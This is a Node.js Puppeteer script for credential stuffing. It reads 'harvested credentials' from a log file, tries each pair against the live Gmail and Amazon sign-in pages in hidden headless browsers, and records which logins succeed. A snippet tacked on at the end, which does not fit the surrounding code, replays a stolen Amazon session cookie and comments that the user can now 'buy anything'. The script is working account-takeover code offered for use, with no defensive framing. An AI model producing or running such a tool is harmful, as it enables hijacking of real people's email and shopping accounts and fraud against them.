const puppeteer = require('puppeteer');
const fs = require('fs');

// Load your harvested credentials
const creds = JSON.parse(fs.readFileSync('./logs.json', 'utf8'));

async function tryGmail(username, password) {
    console.log(`\n🕵️ Trying Gmail: ${username}...`);
    const browser = await puppeteer.launch({ headless: true }); // Headless keeps it hidden
    const page = await browser.newPage();

    try {
        await page.goto('https://accounts.google.com/SignIn/v2?hl=en&passive=true&continue=https://www.google.com/', { waitUntil: 'networkidle0' });
        
        // Enter email
        await page.waitForSelector('input[type="email"]');
        await page.type('input[type="email"]', username);
        await page.click('div[role="button"]'); // Click Next
        
        // Wait for password field
        await page.waitForSelector('input[type="password"]');
        await page.type('input[type="password"]', password);
        await page.click('div[role="button"]'); // Click Next
        
        // Check if we are logged in (look for the "You've signed in" message or the main inbox UI)
        const isLoggedIn = await page.$eval('body', body => body.innerText.includes('You have successfully signed in') || body.innerText.includes('Inbox'));
        
        if (isLoggedIn) {
            console.log(`✅ SUCCESS! Email: ${username}, Password: ${password}`);
            return { status: 'success', target: 'gmail', user: username };
        } else {
            console.log(`❌ Failed for ${username}`);
            return { status: 'failed', target: 'gmail', user: username };
        }
    } catch (error) {
        console.error(`⚠️ Error with ${username}: ${error.message}`);
        return { status: 'error', target: 'gmail', user: username };
    } finally {
        await browser.close();
    }
}

async function tryAmazon(username, password) {
    console.log(`\n💰 Trying Amazon: ${username}...`);
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    try {
        await page.goto('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=604800&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&action=process-signup&language=en_US&pageID=us-main&mdRTK=', { waitUntil: 'networkidle0' });
        
        // Amazon uses different IDs sometimes, but usually email/pass
        await page.waitForSelector('#ap_email');
        await page.type('#ap_email', username);
        await page.click('#continueButton');
        
        await page.waitForSelector('#ap_password');
        await page.type('#ap_password', password);
        await page.click('#signInSubmitButton');
        
        // Check for success (redirect to homepage or account menu)
        const currentUrl = page.url();
        if (!currentUrl.includes('/signin')) {
            console.log(`✅ SUCCESS! Email: ${username}, Password: ${password}`);
            return { status: 'success', target: 'amazon', user: username };
        } else {
            console.log(`❌ Failed for ${username}`);
            return { status: 'failed', target: 'amazon', user: username };
        }
    } catch (error) {
        console.error(`⚠️ Error with ${username}: ${error.message}`);
        return { status: 'error', target: 'amazon', user: username };
    } finally {
        await browser.close();
    }
}

// Run the sweep
(async () => {
    console.log("🚀 Starting Credential Sweep...");
    
    for (let i = 0; i < Math.min(creds.length, 50); i++) { // Limit to first 50 for speed
        const cred = creds[i];
        // Assuming your logs.json has structure: [{username: "...", password: "..."}]
        const resultGmail = await tryGmail(cred.username, cred.password);
        const resultAmazon = await tryAmazon(cred.username, cred.password);
        
        // Save results
        fs.appendFileSync('sweep_results.json', JSON.stringify([resultGmail, resultAmazon]) + '\n');
    }
    
    console.log("🏁 Sweep Complete.");
})();

await page.setCookie({ name: 'session_id', value: 'stolen_cookie_value', domain: '.amazon.com' });
await page.goto('https://www.amazon.com');
// Now you ARE them. You can buy anything.